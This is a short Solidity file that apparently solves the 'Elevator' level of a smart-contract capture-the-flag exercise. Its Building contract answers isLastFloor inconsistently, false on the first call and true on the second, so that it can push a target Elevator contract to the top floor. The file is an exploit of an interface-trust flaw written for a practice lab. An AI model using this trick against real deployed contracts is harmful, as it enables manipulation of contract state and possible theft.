pragma solidity ^0.4.18;

contract Elevator {
    function goTo(uint _floor) public;
}

contract Building {
    bool public secondCall;

    function Building() public {
        secondCall = false;
    }

    function isLastFloor(uint) public returns (bool) {
        if (!secondCall) {
            secondCall = true;
            return false;
        }

        return true;
    }

    function toTheTop(address _elevator) public {
        Elevator elevator = Elevator(_elevator);
        elevator.goTo(666);
    }
}